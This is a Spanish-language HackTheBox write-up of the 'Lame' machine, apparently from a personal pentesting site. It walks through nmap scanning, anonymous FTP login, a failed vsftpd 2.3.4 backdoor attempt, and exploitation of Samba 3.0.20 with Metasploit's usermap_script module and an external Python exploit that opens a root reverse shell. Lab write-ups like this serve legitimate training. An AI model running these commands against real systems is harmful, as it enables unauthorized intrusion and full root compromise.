@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>LAME | HackTheBox | naow</title>
+
+    <link rel="stylesheet" href="../styles/main.css">
+
+    <style>
+        .writeup {
+            background: #1a1a1a;
+            padding: 30px;
+            border-radius: 5px;
+            border: 1px solid #333;
+        }
+
+        .writeup h1 {
+            margin-top: 0;
+        }
+
+        .writeup h2 {
+            margin-top: 35px;
+            color: #4CAF50;
+        }
+
+        .writeup p {
+            margin-bottom: 15px;
+        }
+
+        .writeup ul {
+            margin: 20px 0;
+            padding-left: 25px;
+        }
+
+        .writeup li {
+            margin-bottom: 8px;
+        }
+
+        .writeup pre {
+            background: #0a0a0a;
+            padding: 15px;
+            overflow-x: auto;
+            border-radius: 4px;
+            border: 1px solid #333;
+        }
+
+        .writeup code {
+            font-family: 'Courier New', monospace;
+        }
+
+        .writeup-image {
+            display: block;
+            max-width: 100%;
+            height: auto;
+            margin: 25px auto;
+            border-radius: 5px;
+            border: 1px solid #333;
+        }
+
+        .writeup a {
+            color: #4CAF50;
+        }
+
+        .warning {
+            border-left: 3px solid #4CAF50;
+            padding: 10px 15px;
+            margin: 20px 0;
+            background: #111;
+        }
+    </style>
+
+</head>
+
+<body>
+
+<header>
+
+    <h1>naow</h1>
+
+    <p>Pentester & Red Team</p>
+
+    <nav>
+        <a href="../index.html">Inicio</a>
+        <a href="../maquinas.html">Máquinas</a>
+        <a href="../about.html">Sobre Mí</a>
+    </nav>
+
+</header>
+
+
+<main>
+
+    <article class="writeup">
+
+        <p>
+            <a href="../maquinas.html">← Volver a Máquinas</a>
+        </p>
+
+
+        <h1>LAME</h1>
+
+        <p class="date">
+            HackTheBox | Dificultad: Fácil
+        </p>
+
+
+        <!-- INTRODUCCIÓN -->
+
+        <h2>Introducción</h2>
+
+        <p>
+            LAME es una máquina Linux de HackTheBox de dificultad fácil.
+            Comenzaremos realizando un reconocimiento de los servicios
+            expuestos para identificar posibles vectores de entrada.
+        </p>
+
+        <p>
+            Durante la enumeración encontramos diferentes servicios,
+            entre ellos FTP y SMB. El servicio FTP utiliza una versión
+            vulnerable de vsftpd, por lo que inicialmente investigaremos
+            esta vía.
+        </p>
+
+        <p>
+            Sin embargo, aunque la versión de vsftpd es vulnerable,
+            el exploit no consigue proporcionarnos acceso a la máquina,
+            por lo que descartamos esta vía y continuamos con la
+            enumeración del servicio SMB.
+        </p>
+
+        <p>
+            Finalmente identificamos una versión vulnerable de Samba
+            y conseguimos explotarla utilizando Metasploit y un exploit
+            externo, obteniendo directamente una shell como ROOT.
+        </p>
+
+
+        <!-- 1 RECONOCIMIENTO -->
+
+        <h2>1. Reconocimiento</h2>
+
+        <p>
+            Comenzamos realizando un escaneo completo de puertos para
+            identificar todos los servicios expuestos en la máquina.
+        </p>
+
+        <pre><code>nmap -sS --min-rate 5000 -vvv -n -Pn 10.129.101.170 -oG allports</code></pre>
+
+        <p>
+            El escaneo nos permite identificar los siguientes puertos
+            abiertos:
+        </p>
+
+        <ul>
+            <li><strong>21/tcp</strong> → FTP</li>
+            <li><strong>22/tcp</strong> → SSH</li>
+            <li><strong>139/tcp</strong> → NetBIOS / SMB</li>
+            <li><strong>445/tcp</strong> → SMB</li>
+            <li><strong>3632/tcp</strong> → distccd</li>
+        </ul>
+
+        <img
+            src="../assets/images/lame/01-nmap.png"
+            alt="Escaneo inicial de Nmap"
+            class="writeup-image"
+        >
+
+
+        <!-- 2 ENUMERACIÓN -->
+
+        <h2>2. Enumeración de servicios</h2>
+
+        <p>
+            Una vez identificados los puertos abiertos, realizamos un
+            segundo escaneo utilizando scripts de enumeración y detección
+            de versiones.
+        </p>
+
+        <pre><code>nmap -p21,22,139,445,3632 -sCV 10.129.101.170 -oN targeted</code></pre>
+
+        <p>
+            En esta ocasión obtenemos información más detallada sobre
+            los servicios que se están ejecutando:
+        </p>
+
+        <ul>
+            <li><strong>21/tcp</strong> → vsftpd 2.3.4</li>
+            <li><strong>22/tcp</strong> → OpenSSH 4.7p1 Debian</li>
+            <li><strong>139/tcp</strong> → Samba smbd 3.X - 4.X</li>
+            <li><strong>445/tcp</strong> → Samba 3.0.20-Debian</li>
+            <li><strong>3632/tcp</strong> → distccd</li>
+        </ul>
+
+        <img
+            src="../assets/images/lame/02-nmapvuln.png"
+            alt="Enumeración de servicios con Nmap"
+            class="writeup-image"
+        >
+
+
+        <!-- 3 FTP -->
+
+        <h2>3. Enumeración de FTP</h2>
+
+        <p>
+            Comenzamos investigando el servicio FTP expuesto en el
+            puerto 21.
+        </p>
+
+        <p>
+            Primero comprobamos si el servidor permite iniciar sesión
+            utilizando el usuario <strong>anonymous</strong>.
+        </p>
+
+        <pre><code>ftp anonymous@10.129.101.170</code></pre>
+
+        <p>
+            El acceso anónimo está permitido y conseguimos iniciar
+            sesión correctamente en el servidor FTP.
+        </p>
+
+        <img
+            src="../assets/images/lame/03-ftploginanonymous.png"
+            alt="Login anónimo en FTP"
+            class="writeup-image"
+        >
+
+
+        <!-- 4 VSFTPD -->
+
+        <h2>4. Vulnerabilidad en vsftpd 2.3.4</h2>
+
+        <p>
+            El banner del servicio FTP nos indica que estamos ante
+            <strong>vsftpd 2.3.4</strong>.
+        </p>
+
+        <p>
+            Esta versión es conocida por contener una puerta trasera,
+            por lo que comprobamos si podemos aprovecharla para obtener
+            acceso remoto.
+        </p>
+
+        <p>
+            Utilizamos el módulo correspondiente de Metasploit:
+        </p>
+
+        <pre><code>use exploit/unix/ftp/vsftpd_234_backdoor</code></pre>
+
+        <p>
+            Configuramos el objetivo y ejecutamos el exploit. Aunque
+            Metasploit identifica que la versión parece vulnerable,
+            la explotación no consigue establecer una sesión.
+        </p>
+
+        <img
+            src="../assets/images/lame/04-ftpvulnnofunciona.png"
+            alt="Exploit de vsftpd 2.3.4 sin resultado"
+            class="writeup-image"
+        >
+
+        <div class="warning">
+            <strong>Resultado:</strong>
+            La vía de explotación mediante vsftpd no funciona en este
+            caso, por lo que la descartamos y continuamos con la
+            enumeración del resto de servicios.
+        </div>
+
+
+        <!-- 5 SMB -->
+
+        <h2>5. Enumeración de SMB</h2>
+
+        <p>
+            Continuamos con la enumeración del servicio SMB expuesto
+            mediante los puertos 139 y 445.
+        </p>
+
+        <p>
+            La enumeración nos permite identificar que el servidor está
+            ejecutando <strong>Samba 3.0.20-Debian</strong>.
+        </p>
+
+        <p>
+            Esta versión resulta especialmente interesante debido a
+            que existe una vulnerabilidad conocida que permite ejecutar
+            comandos de forma remota.
+        </p>
+
+        <img
+            src="../assets/images/lame/0-5 enumeracion smb.png"
+            alt="Enumeración de SMB"
+            class="writeup-image"
+        >
+
+
+        <!-- 6 METASPLOIT -->
+
+        <h2>6. Explotación mediante Metasploit</h2>
+
+        <p>
+            Una vez identificada la versión de Samba, buscamos un
+            exploit compatible utilizando Metasploit.
+        </p>
+
+        <pre><code>msfconsole</code></pre>
+
+        <p>
+            Buscamos exploits relacionados con Samba 3.0.20:
+        </p>
+
+        <pre><code>search Samba 3.0.20</code></pre>
+
+        <p>
+            Entre los resultados encontramos el módulo:
+        </p>
+
+        <pre><code>exploit/multi/samba/usermap_script</code></pre>
+
+        <p>
+            Configuramos la dirección IP del objetivo y nuestra dirección
+            IP para recibir la conexión:
+        </p>
+
+        <pre><code>set RHOSTS 10.129.101.170
+set LHOST 10.10.16.102
+run</code></pre>
+
+        <p>
+            Al ejecutar el exploit conseguimos abrir una sesión remota
+            contra la máquina.
+        </p>
+
+        <img
+            src="../assets/images/lame/06 shell conseguida mediante msfconsole.png"
+            alt="Shell conseguida mediante Metasploit"
+            class="writeup-image"
+        >
+
+
+        <!-- 7 EXPLOIT GITHUB -->
+
+        <h2>7. Explotación mediante exploit externo</h2>
+
+        <p>
+            Además de utilizar Metasploit, comprobamos la explotación
+            mediante un exploit externo para la misma vulnerabilidad
+            de Samba.
+        </p>
+
+        <p>
+            El exploit permite especificar nuestra dirección IP,
+            el puerto de escucha y la dirección IP del objetivo.
+        </p>
+
+        <pre><code>python3 smb3.0.20.py -lh 10.10.16.102 -lp 4444 -t 10.129.101.170</code></pre>
+
+        <p>
+            El exploit genera el payload y lo envía contra el objetivo.
+        </p>
+
+        <img
+            src="../assets/images/lame/07-exploitqueusaremosparaentrar.png"
+            alt="Exploit externo utilizado para explotar Samba"
+            class="writeup-image"
+        >
+
+        <p>
+            Tras ejecutar el exploit conseguimos recibir una conexión
+            desde la máquina objetivo.
+        </p>
+
+        <img
+            src="../assets/images/lame/08- obtenershellmedianteexploitsinmsfconsole.png"
+            alt="Shell obtenida mediante el exploit"
+            class="writeup-image"
+        >
+
+
+        <!-- 8 ROOT -->
+
+        <h2>8. Obtención de ROOT</h2>
+
+        <p>
+            Una vez obtenemos acceso a la máquina, comprobamos el usuario
+            con el que estamos ejecutando la shell.
+        </p>
+
+        <pre><code>id</code></pre>
+
+        <p>
+            El resultado confirma que el acceso obtenido corresponde
+            directamente al usuario <strong>root</strong>.
+        </p>
+
+        <pre><code>uid=0(root) gid=0(root)</code></pre>
+
+        <img
+            src="../assets/images/lame/09-conseguimoslarootshell.png"
+            alt="Shell ROOT conseguida en LAME"
+            class="writeup-image"
+        >
+
+
+        <!-- 9 CONCLUSIÓN -->
+
+        <h2>9. Conclusión</h2>
+
+        <p>
+            LAME es una máquina en la que la enumeración inicial permite
+            identificar varios servicios potencialmente interesantes.
+        </p>
+
+        <p>
+            En primer lugar encontramos un servidor FTP ejecutando
+            <strong>vsftpd 2.3.4</strong>. Aunque esta versión presenta
+            una vulnerabilidad conocida, el exploit probado no consigue
+            proporcionarnos acceso, por lo que descartamos esta vía.
+        </p>
+
+        <p>
+            Continuando con la enumeración encontramos el servicio SMB
+            ejecutando <strong>Samba 3.0.20-Debian</strong>, una versión
+            vulnerable.
+        </p>
+
+        <p>
+            Utilizando el módulo <strong>usermap_script</strong> de
+            Metasploit conseguimos explotar el servicio y obtener
+            acceso remoto.
+        </p>
+
+        <p>
+            También comprobamos la explotación utilizando un exploit
+            externo, obteniendo igualmente una shell.
+        </p>
+
+        <p>
+            Finalmente comprobamos que el acceso obtenido dispone
+            directamente de privilegios de <strong>ROOT</strong>,
+            por lo que no es necesario realizar una fase adicional
+            de escalada de privilegios.
+        </p>
+
+        <p>
+            <strong>LAME completada.</strong>
+        </p>
+
+    </article>
+
+</main>
+
+
+<footer>
+
+    <p>© 2026 naow</p>
+
+</footer>
+
+
+</body>
+</html>
